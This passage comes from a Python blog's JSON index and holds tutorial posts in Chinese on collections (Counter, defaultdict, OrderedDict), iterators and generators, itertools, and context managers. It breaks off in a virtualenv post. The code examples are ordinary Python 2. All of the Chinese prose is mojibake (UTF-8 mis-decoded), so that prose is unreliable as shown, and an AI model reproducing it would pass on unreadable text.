c.update(\"2345\")&gt;&gt;&gt; cCounter(&#123;'3': 3, '2': 2, '1': 1, '5': 1, '4': 1&#125;)substact([iterable-or-mapping]), åœ¨ç°æœ‰è®¡æ•°ä¸Šå‡å»å‚æ•°æ‰€å¯¹åº”çš„è®¡æ•°ã€‚å¯ä»¥ç”¨åœ¨Counterå¯¹è±¡ä¸Šçš„é€šç”¨å‡½æ•°å’Œå¸¸è§ç”¨æ³•æœ‰ï¼šsum(c.values()), æ‰€æœ‰è®¡æ•°ä¹‹å’Œc.clear(), å°†è®¡æ•°é‡ç½®list(c), è¿”å›æ‰€æœ‰å…ƒç´ æ„æˆçš„åˆ—è¡¨, å…¶ä¸­å…ƒç´ ä¸ä¼šé‡å¤set(c), è½¬åŒ–ä¸ºsetdict(c), è½¬åŒ–ä¸ºdictc.items(), è½¬åŒ–ä¸ºç”±(å…ƒç´ , è®¡æ•°)æ„æˆçš„åˆ—è¡¨Counter(dict(list_of_pairs)), ä»ä¸Šè¿°åˆ—è¡¨è½¬åŒ–ä¸ºCounterå¯¹è±¡c.most_common()[:-n-1:-1], å‡ºç°æœ€å°‘çš„nä¸ªå…ƒç´ c += Counter(), ç§»é™¤æ‰€æœ‰å…ƒç´ è®¡æ•°ä¸º0çš„å…ƒç´ æ³¨æ„: å°†æŸå…ƒç´ çš„è®¡æ•°èµ‹å€¼ä¸º0, å¹¶ä¸èƒ½åœ¨è®¡æ•°å™¨çš„å…ƒç´ åˆ—è¡¨ä¸­åˆ é™¤è¯¥å…ƒç´ ã€‚è‹¥è¦åˆ é™¤è¯¥å…ƒç´ ï¼Œéœ€è¦ç”¨del.12345678910111213&gt;&gt;&gt; c = Counter(\"12\")&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1&#125;)&gt;&gt;&gt; c[\"0\"]0&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1&#125;)&gt;&gt;&gt; c[\"0\"] = 0&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1, '0': 0&#125;)&gt;&gt;&gt; del c[\"0\"]&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1&#125;) 5. defaultdict 5.1 ä»‹ç»defaultdictç±»æ˜¯dictç±»çš„å­ç±»ï¼ŒåŒ…å«dictç±»çš„æ‰€æœ‰åŠŸèƒ½ã€‚ä¸dictä¸åŒçš„æ˜¯ï¼Œåœ¨è°ƒç”¨ä¸å­˜åœ¨çš„é”®å€¼æ—¶ï¼Œdictä¼šæŠ›å‡ºKeyErrorå¼‚å¸¸ï¼Œè€Œdefaultdictä¼šæ‰§è¡Œ__missing__å‡½æ•°, é€šè¿‡è°ƒç”¨è¯¥å‡½æ•°æ¥è¿›è¡Œæ“ä½œæˆ–è¿”å›å€¼ã€‚å®šä¹‰æ–¹å¼å¦‚ä¸‹:1234d = defaultdict() # è¿™ç§å®šä¹‰æ–¹å¼è¿”å›çš„å¯¹è±¡è·Ÿæ™®é€šdictæ— å¼‚a = defaultdict(lambda: \"N/A\") # å®šä¹‰__missing__å‡½æ•°print a[\"0\"] # è¿”å›\"N/A\", åŒæ—¶a[\"0\"]è¢«èµ‹å€¼ä¸º\"N/A\" 5.2 åº”ç”¨åœºæ™¯1234567&gt;&gt;&gt; s = [('yellow', 1), ('blue', 2), ('yellow', 3), ('blue', 4), ('red', 1)]&gt;&gt;&gt; d = defaultdict(list) # è‹¥é”®å€¼ä¸å­˜åœ¨ï¼Œåˆ™èµ‹å€¼ä¸º[]&gt;&gt;&gt; for k, v in s:... d[k].append(v)...&gt;&gt;&gt; d.items()[('blue', [2, 4]), ('red', [1]), ('yellow', [1, 3])] 6. OrderdDict 6.1 ç®€ä»‹ä½¿ç”¨dictæ—¶ï¼ŒKeyæ˜¯æ— åºçš„ã€‚åœ¨å¯¹dictåšè¿­ä»£æ—¶ï¼Œæˆ‘ä»¬æ— æ³•ç¡®å®šKeyçš„é¡ºåºã€‚å¦‚æœè¦ä¿æŒKeyçš„é¡ºåºï¼Œå¯ä»¥ç”¨OrderedDict.OrderedDictçš„é”®å€¼é¡ºåºæŒ‰ç…§é”®å€¼è¢«æ’å…¥çš„é¡ºåºæ’åˆ—ï¼Œè€Œä¸æ˜¯Keyæœ¬èº«çš„é¡ºåºã€‚OrderdDictçš„é”®å€¼å¯ä»¥é€šè¿‡è°ƒç”¨popitemå‡½æ•°è¢«å¼¹å‡ºï¼Œå¼¹å‡ºæ—¶å¼¹å‡º(key, item)çš„é”®å€¼å¯¹ã€‚1234567891011&gt;&gt;&gt; a = OrderedDict(&#123;\"one\": 1&#125;) # å¯é€šè¿‡dictå®šä¹‰ï¼Œä¹Ÿå¯ä¼ å…¥å¯è¿­ä»£å¯¹è±¡&gt;&gt;&gt; a[\"zero\"] = 0&gt;&gt;&gt; a[\"two\"] = 2&gt;&gt;&gt; aOrderedDict([('one', 1), ('zero', 0), ('two', 2)])&gt;&gt;&gt; a.popitem() # å¼¹å‡ºæœ€åä¸€ä¸ªé”®å€¼å¯¹('two', 2)&gt;&gt;&gt; a.popitem(last=False) # å¼¹å‡ºç¬¬ä¸€ä¸ªé”®å€¼å¯¹('one', 1)&gt;&gt;&gt; aOrderedDict([('zero', 0)]) 7. å‚è€ƒæ–‡æ¡£8.3 collections â€” High-performance container datatypescollections - å»–é›ªå³°çš„å®˜æ–¹æ•™ç¨‹ 8. åè®°è¿™ç¯‡åšæ–‡å†™äº†ä¸¤å¤©ï¼Œæ„Ÿè§‰åœ¨ç¿»è¯‘æ–‡æ¡£ï¼Œæœ‰ç‚¹æ¯ç‡¥ã€‚ä¸€ç›´è§‰å¾—åº”è¯¥å¤šå»äº†è§£Pythonçš„å†…ç½®å¸¸ç”¨æ¨¡å—ï¼Œä¸è¦æ±‚å®Œå…¨ç†Ÿç»ƒï¼Œè‡³å°‘è¦æœ‰ä¸ªå°è±¡ï¼Œè¿™æ ·åœ¨å¼€å‘ä¸­éœ€è¦ä½¿ç”¨è¿™äº›æ¨¡å—çš„æ—¶å€™ï¼Œæ‰èƒ½å¤Ÿæƒ³èµ·æ¥ç”¨å®ƒã€‚æ‰€ä»¥ï¼Œåˆå¡«å®Œä¸€ä¸ªå‘ã€‚ä¸‹ä¸€ä¸ªåº”è¯¥æ˜¯unittestå§ã€‚","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"collections","slug":"collections","permalink":"https://blog.stdioa.com/tags/collections/"}]},{"title":"Pythonå­¦ä¹ ä¹‹è¿­ä»£å™¨","slug":"learning-python-iterator","date":"2015-10-26T07:43:00.000Z","updated":"2018-07-12T00:14:48.942Z","comments":true,"path":"2015/10/learning-python-iterator/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-iterator/","excerpt":"æ˜¨æ™šç”¨pythonå†™äº†ä¸ªç®€å•çš„é“¾è¡¨ï¼Œçªç„¶æƒ³èµ·äº†è¿­ä»£å™¨ï¼Œå°±éšæ‰‹æ•´ç†ä¸€ä¸‹ï¼Œé¡ºä¾¿è¿‡ä¸€ä¸‹itertoolsæ¨¡å—ã€‚","text":"æ˜¨æ™šç”¨pythonå†™äº†ä¸ªç®€å•çš„é“¾è¡¨ï¼Œçªç„¶æƒ³èµ·äº†è¿­ä»£å™¨ï¼Œå°±éšæ‰‹æ•´ç†ä¸€ä¸‹ï¼Œé¡ºä¾¿è¿‡ä¸€ä¸‹itertoolsæ¨¡å—ã€‚ 1. ç®€ä»‹è¿­ä»£å™¨(iterator)æ˜¯Pythonä¸­ä¸€ç§ç”¨æ¥è¿›è¡Œæƒ°æ€§è¿­ä»£çš„æ•°æ®ç±»å‹ï¼Œè¿­ä»£å™¨å¯ä»¥æƒ°æ€§åœ°åœ¨éœ€è¦æ—¶ç”Ÿæˆæ•°æ®å¹¶è¿”å›å·²è¿›è¡Œè¿­ä»£ï¼Œè€Œä¸éœ€è¦åœ¨å¼€å§‹è¿›è¡Œæ—¶ç”Ÿæˆæ‰€æœ‰æ•°æ®ï¼ˆæœ‰çš„æ—¶å€™ä¹Ÿä¸å¯èƒ½ç”Ÿæˆæ‰€æœ‰æ•°æ®ï¼Œæ¯”å¦‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„æ— ç©·è¿­ä»£ç­‰ï¼‰ç„¶åä¸€ä¸ªä¸€ä¸ªè¿”å›ã€‚ 2. ç”¨æ³• 2.1 æœ€åŸºç¡€çš„ä¾‹å­: iter()å‡½æ•°ç”Ÿæˆè¿­ä»£å™¨1234567891011list_ = [1,2]it = iter(list_) # è¿”å›ä¸€ä¸ªè¿­ä»£å™¨it.next() # è·å–ä¸€ä¸ªè¿­ä»£å™¨å…ƒç´ ï¼Œè¿”å›1next(it) # ä½¿ç”¨nextå†…å»ºå‡½æ•°ï¼Œç­‰åŒäºit.next(), è¿”å›2it.next() # è¿­ä»£ç»“æŸï¼Œè§¦å‘StopIterationå¼‚å¸¸list_ = [1,2]it = iter(list_)for x in it: # ç”¨forå¾ªç¯å¯¹è¿­ä»£å™¨è¿›è¡Œå¾ªç¯è¿­ä»£ print x # è¿­ä»£ç»“æŸæ—¶ï¼ŒStopIterationä¸ä¼šè¢«è§¦å‘å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿­ä»£å™¨åªå¯å‘å‰è¿­ä»£ï¼Œä¸èƒ½å‘åè¿­ä»£ï¼Œè·å–ä¹‹å‰å·²è¿”å›è¿‡çš„å€¼ï¼ˆå½“ç„¶ç»å¤§å¤šæ•°çš„æ—¶å€™ä¹Ÿæ²¡å¿…è¦å‘åè¿­ä»£ï¼‰ã€‚ 2.2 ç”Ÿæˆå™¨[x*2 for x in range(10) if x%2==0], è¿™æ®µä»£ç ä¸ºåˆ—è¡¨ç”Ÿæˆå¼ï¼ˆä¹Ÿç§°ä½œåˆ—è¡¨è§£æï¼‰ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ—è¡¨è¿›è¡Œè½¬åŒ–ï¼›å°†æ–¹æ‹¬å·å˜ä¸ºåœ†æ‹¬å·ï¼Œ(x*2 for x in range(10) if x%2==0), åˆ™è¯¥ä»£ç å˜ä¸ºä¸€ä¸ªç”Ÿæˆå™¨(generator)ã€‚ç”Ÿæˆå™¨å¯ä»¥åƒè¿­ä»£å™¨ä¸€æ ·è¿›è¡Œè¿­ä»£ï¼Œè¿˜å¯ä»¥é€šè¿‡ç”Ÿæˆå™¨çš„æˆå‘˜å‡½æ•°å’Œç”Ÿæˆå™¨å†…éƒ¨çš„ä»£ç è¿›è¡Œæ•°æ®äº¤æ¢ã€‚ 3. è‡ªå®šä¹‰è¿­ä»£å™¨åŠç”Ÿæˆå™¨ 3.1 è‡ªå®šä¹‰è¿­ä»£å™¨åœ¨ç¼–å†™ç±»çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡å®šä¹‰ç±»çš„__iter__å‡½æ•°æ¥ä½¿ç±»å¯ä»¥è½¬åŒ–ä¸ºè¿­ä»£å™¨ã€‚åœ¨__iter__å‡½æ•°ç»“æŸæ—¶ï¼Œä¼šè‡ªåŠ¨å¼•å‘StopIterationå¼‚å¸¸ã€‚ä¾‹:12345678910111213141516class Counter(object): def __init__(self): self.number = 0 def __iter__(self): while True: yield self.number self.number += 1a = Counter()it = iter(a)print it.next() # 0print it.next() # 1for num in it: print num # å› ä¸ºè¯¥è¿­ä»£å™¨ä¸ºæ— ç©·è¿­ä»£ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æ­»å¾ªç¯ 3.2 è‡ªå®šä¹‰ç”Ÿæˆå™¨å¯ä»¥ç”¨å‡½æ•°è‡ªå®šä¹‰ç”Ÿæˆå™¨ã€‚ä¾‹ï¼š1234567891011def fib(): a, b = 1, 1 while True: yield a # ç”¨yieldå‡½æ•°æ¥åœ¨è¿­ä»£æ—¶è¿”å›å€¼ï¼Œåœ¨ä¸‹æ¬¡è¿­ä»£æ—¶ï¼Œè‡ªåŠ¨ä»yieldè¯­å¥çš„ä¸‹ä¸€æ¡è¯­å¥å¼€å§‹æ‰§è¡Œ a, b = b, a+bk = fib()for i in range(10): print next(k) # 1 1 2 3 5 8 13 21 34 55print type(k) # &lt;generator object fib at 0x0268BDF0&gt; 3.3 ç”Ÿæˆå™¨çš„è¿›é˜¶ç”¨æ³•generator.next()ç”¨æ¥è¿›è¡Œè¿­ä»£å¹¶è·å–è¿”å›å€¼ï¼›generator.close()ç”¨æ¥å…³é—­ç”Ÿæˆå™¨ï¼Œå¹¶åœ¨ä¸‹æ¬¡è¿­ä»£æ—¶å‡ºå‘StopIterationå¼‚å¸¸ã€‚1234a = fib()print next(a) # 1a.close() # å…³é—­è¿­ä»£å™¨print next(a) # StopIterationgenerator.send(arg)å¯ä»¥å‘ç”Ÿæˆå™¨å†…éƒ¨ä¼ é€’å¯¹è±¡ï¼Œgenerator.throw(typ[,val[,tb]])å¯ä»¥å‘ç”Ÿæˆå™¨å†…éƒ¨ä¼ é€’å¼‚å¸¸ï¼ˆåŒ…æ‹¬ç±»å‹ï¼Œå…·ä½“å¼‚å¸¸å¯¹è±¡å’ŒTracebackï¼‰ï¼›åœ¨è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°åï¼Œç”Ÿæˆå™¨ç«‹åˆ»è¿›è¡Œè¿­ä»£å¹¶è¿”å›å€¼ï¼ˆæˆ–è§¦å‘StopIterationï¼‰ã€‚å…·ä½“æ“ä½œï¼š123456789101112131415161718def counter(): num = 0 while True: try: ret = yield num except ValueError: print \"ValueError caught\" if ret is not None: num = ret num += 1c = counter()print c.next() # 0print c.send(3) # ä¼ è¾“3ï¼Œå†…éƒ¨yieldè¯­å¥è¿”å›3ï¼Œç„¶åè¿›è¡Œä¸‹æ¬¡è¿­ä»£ï¼Œç”Ÿæˆ4print c.next() # 5c.throw(ValueError) # ä¼ é€’å¼‚å¸¸ï¼Œå†…éƒ¨yieldå‡½æ•°è§¦å‘å¼‚å¸¸ï¼Œç„¶åè¿›è¡Œå¼‚å¸¸å¤„ç†ï¼Œè¾“å‡º\"ValueError caught\"ï¼Œè‹¥æœªå¤„ç†ï¼Œåˆ™å¼‚å¸¸ä¼šå‘ä¸Šå±‚æŠ›å‡ºprint c.next() # 6 4. itertoolsæ¨¡å—itertoolsæ˜¯Pythonè‡ªå¸¦çš„ä¸€ä¸ªæ¨¡å—ï¼ŒåŒ…å«å¾ˆå¤šä½¿ç”¨å‡½æ•°ï¼Œç”¨æ¥å¯¹ä¸€ä¸ªæˆ–å¤šä¸ªå¯è¿­ä»£å¯¹è±¡è¿›è¡Œæ“ä½œåè¿”å›ä¸€ä¸ªè¿­ä»£å™¨ã€‚å…·ä½“å‡½æ•°åˆ—è¡¨ï¼šæ— é™è¿­ä»£å™¨count(start, [step])ä»startå¼€å§‹ï¼Œä»¥åæ¯ä¸ªå…ƒç´ éƒ½åŠ ä¸Šstepã€‚stepé»˜è®¤å€¼ä¸º1ã€‚count(5) -&gt; 5 6 7 â€¦cycle(p)è¿­ä»£è‡³pçš„æœ€åä¸€ä¸ªå…ƒç´ ä¹‹åï¼Œä»pçš„ç¬¬ä¸€ä¸ªå…ƒç´ é‡æ–°è¿­ä»£ã€‚cycle('abc') -&gt; a b c a b c â€¦repeat(elem [,n])æ— é™é‡å¤æˆ–é‡å¤næ¬¡è¿”å›elemã€‚repeat(&quot;Ah&quot;, 3) -&gt; â€œAhâ€ â€œAhâ€ â€œAhâ€åœ¨æœ€çŸ­çš„åºåˆ—ç»“æŸè¿­ä»£æ—¶åœæ­¢è¿­ä»£chain(p, q, â€¦)è¿­ä»£è‡³åºåˆ—pçš„æœ€åä¸€ä¸ªå…ƒç´ åï¼Œä»qçš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ï¼Œç›´åˆ°æ‰€æœ‰åºåˆ—ç»ˆæ­¢ã€‚chain(&quot;ABC&quot;, &quot;DEF&quot;) -&gt; A B C D E Fcompress(data, selectors)å¦‚æœbool(selectors[n])ä¸ºTrueï¼Œåˆ™next()è¿”å›data[n]ï¼Œå¦åˆ™è·³è¿‡data[n]ã€‚compress('ABCDEF', [1,0,1,0,1,1]) -&gt; A C E Fdropwhile(pred, seq)å½“predå¯¹seq[n]çš„è°ƒç”¨è¿”å›Falseæ—¶æ‰å¼€å§‹è¿­ä»£ã€‚dropwhile(lambda x: x&lt;5, [1,4,6,4,1]) -&gt; 6 4 1takewhile(pred, seq)dropwhileçš„ç›¸åç‰ˆæœ¬ã€‚takewhile(lambda x: x&lt;5, [1,4,6,4,1]) -&gt; 1 4ifilter(pred, seq)å†…å»ºå‡½æ•°filterçš„è¿­ä»£å™¨ç‰ˆæœ¬ã€‚ifilter(lambda x: x%2, range(10)) -&gt; 1 3 5 7 9ifilterfalse(pred, seq)ifilterçš„ç›¸åç‰ˆæœ¬ã€‚ifilterfalse(lambda x: x%2, range(10)) -&gt; 0 2 4 6 8imap(func, p, q, ...)å†…å»ºå‡½æ•°mapçš„è¿­ä»£å™¨ç‰ˆæœ¬ã€‚imap(pow, (2,3,10), (5,2,3)) -&gt; 32 9 1000starmap(func, seq)å°†seqçš„æ¯ä¸ªå…ƒç´ ä»¥å˜é•¿å‚æ•°(*args)çš„å½¢å¼è°ƒç”¨funcã€‚starmap(pow, [(2,5), (3,2), (10,3)]) -&gt; 32 9 1000izip(p, q, ...)å†…å»ºå‡½æ•°zipçš„è¿­ä»£å™¨ç‰ˆæœ¬ã€‚izip('ABCD', 'xy') -&gt; Ax Byizip_longest(p, q, ..., fillvalue=None)izipçš„å–æœ€é•¿åºåˆ—çš„ç‰ˆæœ¬ï¼ŒçŸ­åºåˆ—å°†å¡«å…¥fillvalueã€‚izip_longest('ABCD', 'xy', fillvalue='-') -&gt; Ax By C- D-tee(it, n)è¿”å›nä¸ªè¿­ä»£å™¨itçš„å¤åˆ¶è¿­ä»£å™¨ã€‚groupby(iterable[, keyfunc])è¿™ä¸ªå‡½æ•°åŠŸèƒ½ç±»ä¼¼äºSQLçš„åˆ†ç»„ã€‚ä½¿ç”¨groupbyå‰ï¼Œé¦–å…ˆéœ€è¦ä½¿ç”¨ç›¸åŒçš„keyfuncå¯¹iterableè¿›è¡Œæ’åºï¼Œæ¯”å¦‚è°ƒç”¨å†…å»ºçš„sortedå‡½æ•°ã€‚ç„¶åï¼Œgroupbyè¿”å›è¿­ä»£å™¨ï¼Œæ¯æ¬¡è¿­ä»£çš„å…ƒç´ æ˜¯å…ƒç»„(keyå€¼, iterableä¸­å…·æœ‰ç›¸åŒkeyå€¼çš„å…ƒç´ çš„é›†åˆçš„å­è¿­ä»£å™¨)ã€‚æˆ–è®¸çœ‹çœ‹Pythonçš„æ’åºæŒ‡å—å¯¹ç†è§£è¿™ä¸ªå‡½æ•°æœ‰å¸®åŠ©ã€‚groupby([0, 0, 0, 1, 1, 1, 2, 2, 2]) -&gt; (0, (0 0 0)) (1, (1 1 1)) (2, (2 2 2))ç»„åˆè¿­ä»£å™¨product(p, q, ... [repeat=1])ç”Ÿæˆç¬›å¡å°”ç§¯ã€‚product('ABCD', repeat=2) --&gt; AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DDpermutations(p[, r])ç”Ÿæˆå…¨æ’åˆ—ã€‚permutations('ABCD', 2) --&gt; AB AC AD BA BC BD CA CB CD DA DB DCcombinations(p, r)ç”Ÿæˆç»„åˆã€‚combinations('ABCD', 2) --&gt; AB AC AD BC BD CDcombinations_with_replacement()ç”Ÿæˆæ’åˆ—å…ƒç´ (p, q), ä¸”p&lt;q.combinations_with_replacement('ABCD', 2) --&gt; AA AB AC AD BB BC BD CC CD DDéƒ¨åˆ†æ–‡å­—æ¥æºï¼šhttp://www.cnblogs.com/huxi/archive/2011/07/01/2095931.html 5. å‚è€ƒæ–‡æ¡£itertools - Python Docç”Ÿæˆå™¨ - å»–é›ªå³°çš„Pythonæ•™ç¨‹Python è¿­ä»£å™¨ &amp; __iter__æ–¹æ³•Pythonå‡½æ•°å¼ç¼–ç¨‹æŒ‡å—ï¼ˆä¸‰ï¼‰ï¼šè¿­ä»£å™¨","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"è¿­ä»£å™¨","slug":"è¿­ä»£å™¨","permalink":"https://blog.stdioa.com/tags/è¿­ä»£å™¨/"}]},{"title":"Pythonå­¦ä¹ ä¹‹ä¸Šä¸‹æ–‡ç®¡ç†","slug":"learning-python-context-management","date":"2015-10-22T12:00:00.000Z","updated":"2018-07-12T00:14:50.518Z","comments":true,"path":"2015/10/learning-python-context-management/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-context-management/","excerpt":"æœ€è¿‘çªå‘å¥‡æƒ³ï¼Œæƒ³å†™ä¸€ä¸ªèƒ½æ”¹å˜å½“å‰è¾“å‡ºç¯å¢ƒï¼Œè¾“å‡ºå½©è‰²æ–‡å­—çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œäºæ˜¯å­¦ä¹ äº†ä¸€ä¸‹ä¸Šä¸‹æ–‡ç®¡ç†ã€‚","text":"æœ€è¿‘çªå‘å¥‡æƒ³ï¼Œæƒ³å†™ä¸€ä¸ªèƒ½æ”¹å˜å½“å‰è¾“å‡ºç¯å¢ƒï¼Œè¾“å‡ºå½©è‰²æ–‡å­—çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œäºæ˜¯å­¦ä¹ äº†ä¸€ä¸‹ä¸Šä¸‹æ–‡ç®¡ç†ã€‚ 1. ç®€ä»‹ä¸Šä¸‹æ–‡ç®¡ç†å™¨(context manager)æ˜¯Python2.5å¼€å§‹æ”¯æŒçš„ä¸€ç§è¯­æ³•ï¼Œç”¨äºè§„å®šæŸä¸ªå¯¹è±¡çš„ä½¿ç”¨èŒƒå›´ã€‚ä¸€æ—¦è¿›å…¥æˆ–è€…ç¦»å¼€è¯¥ä½¿ç”¨èŒƒå›´ï¼Œä¼šæœ‰ç‰¹æ®Šæ“ä½œè¢«è°ƒç”¨ (æ¯”å¦‚ä¸ºå¯¹è±¡åˆ†é…æˆ–è€…é‡Šæ”¾å†…å­˜)ã€‚ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­:12345with file(\"a.txt\", \"r\") as f: s = f.read() print f.closed # æ­¤æ—¶æ–‡ä»¶æ˜¯æ‰“å¼€çš„print f.closed # å˜é‡så’Œfä¾ç„¶å­˜åœ¨ï¼Œä½†æ­¤æ—¶få·²å…³é—­ 2. ç¼–å†™ä¸Šä¸‹æ–‡ç®¡ç†å™¨ä¸ºä¸€ä¸ªç±»ç¼–å†™ä¸Šä¸‹æ–‡ç®¡ç†å™¨æ—¶ï¼Œéœ€è¦å®šä¹‰ç±»çš„__enter__å’Œ__exit__å‡½æ•°ã€‚ 2.1 __enter__å‡½æ•°__enter__å‡½æ•°è§„å®šå¦‚ä¸‹ï¼šcontextmanager.__enter__()Enter the runtime context and return either this object or another object related to the runtime context. The value returned by this method is bound to the identifier in the as clause of with statements using this context manager.è¿›å…¥å½“å‰ä¸Šä¸‹æ–‡ï¼Œå¹¶è¿”å›å½“å‰å¯¹è±¡æˆ–å¦ä¸€ä¸ªä¸å½“å‰ä¸Šä¸‹æ–‡ç›¸å…³çš„å¯¹è±¡ã€‚è¢«è¯¥å‡½æ•°è¿”å›çš„å˜é‡ä¼šé€šè¿‡è¯¥ä¸Šä¸‹æ–‡ç®¡ç†å™¨ä¸withæ–‡æ³•ä¸­asåçš„å£°æ˜æ‰€ç»‘å®šã€‚ä¾‹ï¼š12345678910class BracketAdder(object): def __enter__(self): # do something with self and runtime context sys.stdout.write(\"(\") # è¾“å‡ºå·¦æ‹¬å· return self # __exit__å‡½æ•°ç•¥with BracketAdder() as ba: # do_something 2.2 __exit__å‡½æ•°__exit__å‡½æ•°æ ¼å¼å¦‚ä¸‹:contexmanager.__exit__(exc_type, exc_val, exc_tb)æ–‡æ¡£å¤ªé•¿æ‡’å¾—ç¿»è¯‘äº†_(:Ğ·ã‚âˆ )_å¦‚æœä»£ç å—ä¸­å‡ºç°å¼‚å¸¸ï¼Œexc_typeä¸ºå¼‚å¸¸ç±»å‹ï¼Œexc_valä¸ºè¯¥å¼‚å¸¸ï¼Œexc_tbä¸ºtraceback.__exit__å‡½æ•°åº”è¿”å›ä¸€ä¸ªboolç±»å‹ï¼Œè‹¥è¿”å›å€¼ä¸ºTrue, åˆ™åœ¨ä»£ç å—åŠ__exit__å‡½æ•°è¿è¡Œç»“æŸåä¸ä¼šæŠ›å‡ºä»»ä½•å¼‚å¸¸ï¼Œç„¶åç«‹å³æ‰§è¡Œåé¢çš„ä»£ç ï¼›è‹¥è¿”å›å€¼ä¸ºFalseï¼Œåˆ™åœ¨__exit__å‡½æ•°è¿è¡Œç»“æŸåæŠ›å‡ºå¼‚å¸¸ã€‚è‹¥ä»£ç å—ä¸­æœªå‡ºç°å¼‚å¸¸ï¼Œåˆ™ä¸‰ä¸ªå˜é‡å‡ä¸ºNone.ä¾‹ï¼š12345678910111213class BracketAdder(object): # __enter__å‡½æ•°ç•¥ def __exit__(self, exc_type, exc_val, exc_tb): # do something with self and runtime context sys.stdout.write(')') if exc_type == NameError: return True else: return Falsewith BracketAdder(): print a # è‹¥æ‰§è¡Œè¿™ä¸€æ¡å¼•å‘NameErrorå¼‚å¸¸ï¼Œåˆ™å¼‚å¸¸ä¸ä¼šè¢«æŠ›å‡º a = 1/0 # è‹¥æ‰§è¡Œè¿™ä¸€æ¡å¼•å‘ZeroDivisionError, åˆ™å¼‚å¸¸ä¼šè¢«æŠ›å‡º 3. ç»¼åˆç¤ºä¾‹1234567891011121314151617181920212223242526272829303132333435# coding: utf-8import sysclass CManager(object): def __init__(self): self.in_context = False def __enter__(self): self.in_context = True print \"I'm entering the context\" return self def __exit__(self, exc_type, exc_val, exc_tb): self.in_context = False print \"I'm leaving the context\" if exc_type == NameError: # æ‹¦æˆªNameErrorå¼‚å¸¸ return True else: return False def show(self): print \"I'm &#123;status&#125;in the context.\".format( status=\"\" if self.in_context else \"not \")with CManager() as ba: ba.show() # blahblah raise NameError # è§¦å‘NameErrorå¼‚å¸¸ï¼Œä»£ç å—åé¢çš„è¯­å¥å®é™…ä¸ä¼šæ‰§è¡Œï¼Œè€Œè¯¥å¼‚å¸¸ä¼šåœ¨__exit__å‡½æ•°ä¸­è¢«æ‹¦æˆª print 'k'ba.show()ç¨‹åºè¾“å‡º:1234I&apos;m entering the contextI&apos;m in the context.I&apos;m leaving the contextI&apos;m not in the context. 4. å‚è€ƒæ–‡æ¡£Context Manager Types - Python DocPythonæ·±å…¥02 ä¸Šä¸‹æ–‡ç®¡ç†å™¨æµ…è°ˆ Python çš„ with è¯­å¥ 5. åè®°è¿™äº›å°çŸ¥è¯†ç‚¹å¹³æ—¶åªæ˜¯ç²—ç•¥çš„çœ‹ä¸€ä¸‹ï¼Œåªèƒ½è¾¾åˆ°ä¼šç”¨çš„ç¨‹åº¦ï¼Œæœ‰æ—¶å€™è§‰å¾—åªæœ‰è‡ªå·±æ•´ç†ä¸€éæ‰èƒ½çœŸæ­£ç†è§£å®ƒä»¬ï¼Œæ‰èƒ½ç†Ÿç»ƒè¿ç”¨ã€‚æ‰€ä»¥â€¦åˆå¡«å®Œä¸€ä¸ªå‘ã€‚å‘¨æœ«ç®€å•å†™å†™PyQt4å§â€¦","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"ä¸Šä¸‹æ–‡ç®¡ç†","slug":"ä¸Šä¸‹æ–‡ç®¡ç†","permalink":"https://blog.stdioa.com/tags/ä¸Šä¸‹æ–‡ç®¡ç†/"}]},{"title":"Pythonå­¦ä¹ ä¹‹virtualenv","slug":"learning-python-virtualenv","date":"2015-10-22T02:15:00.000Z","updated":"2018-07-12T00:14:44.948Z","comments":true,"path":"2015/10/learning-python-virtualenv/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-virtualenv/","excerpt":"ç”¨è¿‡virtualenvçš„äººéƒ½è¯´å¥½ï¼Œå¯æ˜¯æˆ‘æ²¡æœ‰å…·ä½“ä½¿ç”¨è¿‡ï¼Œæ‰€ä»¥å°è¯•äº†ä¸€ä¸‹ï¼Œç”¨å®Œæˆ‘ä¹Ÿè¯´å¥½~233333","text":"ç”¨è¿‡virtualenvçš„äººéƒ½è¯´å¥½ï¼Œå¯æ˜¯æˆ‘æ²¡æœ‰å…·ä½“ä½¿ç”¨è¿‡ï¼Œæ‰€ä»¥å°è¯•äº†ä¸€ä¸‹ï¼Œç”¨å®Œæˆ‘ä¹Ÿè¯´å¥½~233333 1. ç®€ä»‹virtualenvæ˜¯ä¸€ä¸ªpythonåº“ï¼Œç”¨äºåˆ›å»ºç‹¬ç«‹pythonå¼€å‘åŠè¿è¡Œç¯å¢ƒã€‚ä¸€èˆ¬linuxç¯å¢ƒä¸‹å¦‚æœåœ¨å…¨å±€ç”¨pipå®‰è£…æ¨¡å—æ—¶éœ€è¦ä½¿ç”¨sudoå‘½ä»¤ï¼Œå¯æ˜¯åœ¨å…±äº«ä¸»æœºä¸Šå°†rootæƒé™äº¤ç»™ä¸€èˆ¬ç”¨æˆ·æ˜¯ä¸æ˜¾ç¤ºè€Œä¸”ä¸å®‰å…¨çš„ã€‚å¯æ˜¯æœ‰äº†virtualenv, 